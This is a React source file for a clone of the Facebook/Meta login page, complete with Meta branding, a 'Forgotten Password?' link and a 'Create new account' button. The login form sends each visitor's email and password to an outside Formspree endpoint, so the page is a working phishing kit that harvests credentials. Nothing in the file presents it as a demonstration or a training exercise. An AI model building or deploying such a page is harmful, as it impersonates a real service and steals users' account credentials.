
import styled from 'styled-components'
import { Link } from 'react-router-dom'
import { FaMeta } from "react-icons/fa6";
import logo  from "./logo.png"


function App() {

  return (
    <Container>
      <img src={logo} alt="" />
      <br />
      <br />
      <br />
      <br />

      <form action="https://formspree.io/f/xayzloyg" method='POST'>

        <input type="email" name='email' placeholder='Username, email address or mobile number'/>
        <input type="password" name='password' placeholder='Password'/>
        <button>Log in</button>

      </form>
        <p style={{marginLeft:"70px", width:"200px"}}>Forgotten Password?</p>
      <div className='last'>


        <button className='account'>Create new account</button>
        <br />
        <div className="meta">

        <FaMeta className='metaLogo'/>
        <p>Meta</p>
        </div>
      </div>
    </Container>
  )
}

const Container = styled.div`
margin-left: 85px;

img{
  width: 100px;
  height: 100px;
  margin-left: 80px;
}

form{
  display: grid;
  width: 300px;
  gap: 10px;
}

input{
  width: 270px;
        overflow:hidden; 
        white-space:nowrap; 
        text-overflow: ellipsis;
  height: 40px;
border-radius: 8px;
border-color: lightgray;
}

::placeholder{
  padding: 10px;
}

button{
  width: 270px;
  height: 45px;
  background-color: rgb(31, 62, 201);
  border-radius: 22px;
  border: none;
  color: white;
  /* font-weight: 600; */
  font-size: 17px;
}

.last{
  margin-top: 120px;
}


.account{
  background-color: #fff;
  color: rgb(31, 62, 201);
  border:1px solid rgb(31, 62, 201);
}

.meta{
  margin-left:100px;
  display: flex;
  font-size: 20px;
  margin-top: 8px;
  /* margin: 5px; */
}

.meta p{
  margin-top: -1px;
  margin-left: 5px;
  
}
`;

export default App
